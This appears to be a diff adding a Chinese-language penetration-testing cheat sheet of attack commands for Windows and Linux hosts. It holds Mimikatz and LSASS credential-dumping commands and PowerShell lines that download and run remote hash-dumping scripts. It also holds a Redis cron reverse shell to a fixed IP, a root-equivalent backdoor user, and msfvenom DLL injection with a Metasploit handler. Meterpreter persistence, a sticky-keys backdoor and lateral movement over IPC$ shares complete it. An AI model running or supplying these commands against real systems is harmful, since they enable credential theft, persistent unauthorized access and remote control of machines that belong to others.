@@ -1,0 +1,125 @@
+at&schtasks
+
+需要开启Task Scheduler服务 经典流程：
+
+1、进行一个连接
+net use \\10.10.24.44\ipc$ 密码 /user:账号
+
+2、复制本地文件到10.10.24.44的share共享目录(一般是放入admin$这个共享地方(也就是c:\winnt\system32\)，或者c$，d$)
+copy 4.bat \\10.10.24.44\share
+
+3、查看10.10.24.44服务器的时间
+net time \\10.10.24.44
+
+4、添加at任务执行
+at \\10.10.24.44 6:21 \\10.10.24.44\share\4.bat
+这个6:21指的是上午的时间，如果想添加下午的，则是6.21PM
+
+5、查看添加的所有at任务列表(如果执行了得，就不会显示)
+at \\10.10.24.44
+
+
+查看所有连接
+net use
+删除连接
+net use \\10.10.24.44\share /del
+
+映射共享磁盘到本地
+net use z: \\IP\c$ "密码" /user:"用户名"
+删除共享映射
+net use c: /del
+net use * /del
+
+
+dsquery server         #查看域控服务器
+dsquery subnet        #查看域IP范围
+
+2 第二种方式是把 powershell 文件上传到堡垒机本地执行， powershell.exe ". .\Invoke-Mimikatz.ps1; Invoke-Mimikatz –DumpCreds"
+													   powershell.exe ". .\Out-Minidump.ps1;Get-Process lsass|Out-Minidump" 将导出的dmp文件，传回本地，sekurlsa::minidump xxx.dmp  sekurlsa::logonPasswords就可以得到密码
+													   PowerShell.exe -exec Bypass -File .\runme.ps1 可以用于反弹shell
+													   powershell (new-object Net.WebClient).DownloadFile( 'http://192.168.200.159/backdoor','backdoor.bat') 下载文件，与Linux wget类似
+													   powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes 直接dump hash
+													   powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
+
+http://www.myhack58.com/Article/html/3/8/2015/62619_2.htm
+https://www.secpulse.com/archives/51092.html
+https://www.secpulse.com/archives/51077.html
+https://github.com/jaredhaight/psattackbuildtool,powersploit,powercat
+
+mimikatz.exe privilege::debug sekurlsa::logonPasswords exit >> result.txt
+
+redis cron reverse shell:
+	redis-cli -h $1 flushall
+	echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
+	redis-cli -h $1 config set dir /var/spool/cron/
+	redis-cli -h $1 config set dbfilename root
+	redis-cli -h $1 save
+	
+Linux 添加用户:
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash php
+
+ssh转发,利用生成的ssh公钥登录
+ 1.将发往本机的80端口访问转发到174.139.9.66的8080端口
+
+ssh -C -f -N -g -L 80:174.139.9.66:8080     master@174.139.9.66
+
+2.将发往174.139.9.66的8080访问转发到174.139.1.67的80端口
+
+ssh -C -f -N -g -R 80:174.139.9.66:8080            master@174.139.1.67在本机运行
+%windir%\SysWoW64\cmd.exe /c cscript exp.vbs /e db.mdb export.txt
+
+docker,git,wooyun,shell,powershell
+icacls,sc
+http://www.njstu.net/69394.html
+https://www.draw.io/
+ssh -T user@localhost /bin/bash -i
+
+205.171.3.65
+205.171.2.65
+
+php双引号${${phpinfo();}}
+python -m SimpleHTTPServer 233
+
+
+
+dll注入方式:
+1.msfvenom -p windows/x64/meterpreter/reverse_tcp -f dll > p.dll  利用这个生成dll  remotedllinject.exe pid p.dll 在目标机器执行可以得到shell
+2.利用其它方式得到meter会话时，use post/w/man/reflective_dll_inject,set session 1,set pid 222,set path c:\p.dll,run,这样可以达到注入dll
+3.powersploit Invoke-DLLInjection -ProcessID 22 -Dll c:\p.dll 注入msf生成的dll文件，就得到meter会话了
+
+
+
+sed -i "s/http:\/\/cdn.hkcdn.xyz//g" $1 替换为空
+
+python -c 'import pty; pty.spawn("/bin/bash")' 获取交互式shell
+
+find / -perm -u=s(02000) -type f 2>/dev/null    查找suid位的文件或者文件夹
+find / -type d -perm -02000 2>/dev/null
+
+nmap --interactive 防止在命令行中输入命令
+
+grep –R –i "password" /  查找文件中含有这个字符串的文件
+psexec –accepteula
+
+msf.rc:
+use exploit/multi/handler
+set payload windows/x64/powershell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 31242
+exploit -j
+
+msfconsole -r msf.rc
+
+migrate 将进程转移
+post/windows/gather/enum_patches 查找提权模块
+
+meterpreter 中加入开机自启动5s自动回连
+run persistence -X -i 5 -p 41234 -r ip
+
+
+shift后门:
+copy c:\windows\system32\sethc.exe c:\windows\system32\sethc1.exe
+copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
+
+tasklist /s ip /u username /p password  验证密码
